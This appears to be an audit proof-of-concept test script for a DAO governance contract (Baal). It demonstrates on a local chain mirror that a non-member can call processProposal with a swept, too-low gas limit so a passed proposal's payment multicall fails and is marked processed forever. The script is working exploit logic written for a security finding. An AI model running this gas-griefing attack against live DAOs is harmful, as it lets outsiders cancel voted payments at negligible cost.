/**
 * GOV-01 — a passed proposal is killed by anyone who calls processProposal with too little gas.
 *
 * Invariant that should hold: a proposal that passed the vote and survived grace executes its
 * voted multicall when processed (or stays Ready until it can).
 *
 * Why it fails: Baal.processProposal is permissionless and records `actionFailed` instead of
 * reverting when the Safe multicall runs out of gas (the inner call gets 63/64 of the remaining gas,
 * the outer bookkeeping needs ~1/64). Zero One submits every proposal with baalGas = 0
 * (src/proposals.ts, ZeroOneIntentAccount op 0, WorkManager), so Baal's own guard
 * (`gasleft() >= baalGas`) never fires. The first caller's gas limit decides the outcome and the
 * proposal is marked processed forever.
 *
 * Steps: seed → A proposes "pay O 500 USDC + 39 x 1 USDC" (a ~1.2 M gas action) → A, B YES → grace → W (non-member) sends
 * processProposal with a gas limit between the action's need / (63/64) and the outer bookkeeping's need x 64 → passed = true, actionFailed = true, O unpaid, re-processing
 * reverts "!ready". Control: the same proposal at 5,000,000 gas (on a reverted snapshot) pays O.
 */
import { getAddress } from "viem";

import { assert, boot, expectRevert, fmtS, proposalInfo, propose, runIfMain, seedMembers, SETTLEMENT_UNIT, shutdown, simulate, stateOf, step, transferCall, usdcOf, verdict, vote, warpPastGrace } from "../../../scenarios/lib.js";
import { logLine, revertChain, snapshotChain, writeWithGas } from "./audit-lib.js";

const LOG = "t01-lowgas-process-kills-proposal";

/**
 * Run GOV-01 on a fresh mirror.
 *
 * Raises:
 *   Error: when an assertion about the demonstrated failure does not hold.
 */
export async function main(): Promise<void> {
  const mirror = await boot("audit-t01");
  let passed = false;
  try {
    await seedMembers(mirror);
    const O = mirror.actors.O.account.address;
    const pay = 500n * SETTLEMENT_UNIT;

    step("A proposes: Safe pays O 500 USDC plus 39 x 1 USDC to fresh addresses (a multicall the size of a Project/Strategy start; baalGas = 0, as every Zero One proposal)");
    const grantees = Array.from({ length: 39 }, (_, i) => getAddress(`0x${(i + 1).toString(16).padStart(40, "0")}`));
    const proposal = await propose(mirror, "A", [transferCall(mirror, O, pay), ...grantees.map((g) => transferCall(mirror, g, SETTLEMENT_UNIT))], "A: pay O 500 USDC + 39 grants");
    await vote(mirror, "A", proposal.id, true);
    await vote(mirror, "B", proposal.id, true);
    await warpPastGrace(mirror, proposal.id);
    assert((await stateOf(mirror, proposal.id)) === "Ready", "proposal is Ready (passed, grace over)");
    const snap = await snapshotChain(mirror);

    step("control: W processes with the mirror's explicit 5,000,000 gas -> O is paid");
    const oBefore = await usdcOf(mirror, O);
    const ok = await writeWithGas(mirror.actors.W, mirror.dao.baal, mirror.abi.baal, "processProposal", [proposal.id, proposal.data], 5_000_000n);
    const okInfo = await proposalInfo(mirror, proposal.id);
    logLine(LOG, `   control  gas=5000000 status=${ok.status} gasUsed=${ok.gasUsed} passed=${okInfo.status.passed} actionFailed=${okInfo.status.actionFailed} O USDC ${fmtS(oBefore)} -> ${fmtS(await usdcOf(mirror, O))}`);
    assert(okInfo.status.passed && !okInfo.status.actionFailed && (await usdcOf(mirror, O)) === oBefore + pay, "control: the multicall executed and O received 500 USDC");
    await revertChain(mirror, snap);

    step("attack: W (holds no shares) sweeps processProposal gas limits from 500,000 up; first limit where the tx succeeds but the action failed");
    const safeBefore = await usdcOf(mirror, mirror.dao.safe);
    let found: { gas: bigint; gasUsed: bigint } | undefined;
    for (let gas = 500_000n; gas <= 1_600_000n; gas += 25_000n) {
      const snapInner = await snapshotChain(mirror);
      const attempt = await writeWithGas(mirror.actors.W, mirror.dao.baal, mirror.abi.baal, "processProposal", [proposal.id, proposal.data], gas);
      const attemptInfo = await proposalInfo(mirror, proposal.id);
      logLine(LOG, `   sweep gas=${gas} status=${attempt.status} gasUsed=${attempt.gasUsed} processed=${attemptInfo.status.processed} passed=${attemptInfo.status.passed} actionFailed=${attemptInfo.status.actionFailed} O USDC ${fmtS(await usdcOf(mirror, O))}`);
      if (attempt.status === "success" && attemptInfo.status.actionFailed) {
        found = { gas, gasUsed: attempt.gasUsed };
        break;
      }
      await revertChain(mirror, snapInner);
    }
    assert(found !== undefined, "a gas limit exists at which processProposal succeeds while the voted multicall runs out of gas");
    const info = await proposalInfo(mirror, proposal.id);
    const oAfter = await usdcOf(mirror, O);
    logLine(LOG, `   attack   gas=${found.gas} gasUsed=${found.gasUsed} processed=${info.status.processed} passed=${info.status.passed} actionFailed=${info.status.actionFailed} state=${await stateOf(mirror, proposal.id)}`);
    logLine(LOG, `   Safe USDC ${fmtS(safeBefore)} -> ${fmtS(await usdcOf(mirror, mirror.dao.safe))}; O USDC ${fmtS(oBefore)} -> ${fmtS(oAfter)} (voted payment: ${fmtS(pay)})`);
    assert(info.status.processed && info.status.passed && info.status.actionFailed, "Baal recorded processed = true, passed = true, actionFailed = true");
    assert(oAfter === oBefore, "O was never paid");
    await expectRevert(simulate(mirror, "B", "baal", "processProposal", [proposal.id, proposal.data]), "!ready", "the proposal cannot be processed again (state Processed)");
    logLine(LOG, `   attacker cost: ${found.gasUsed} gas (~$0.001 on Base); DAO cost: a new proposal + 12 h; repeatable on every proposal`);
    passed = true;
  } finally {
    verdict("GOV-01 low-gas processProposal kills a passed proposal (finding demonstrated)", passed);
    await shutdown(mirror);
  }
}

runIfMain(import.meta.url, main);
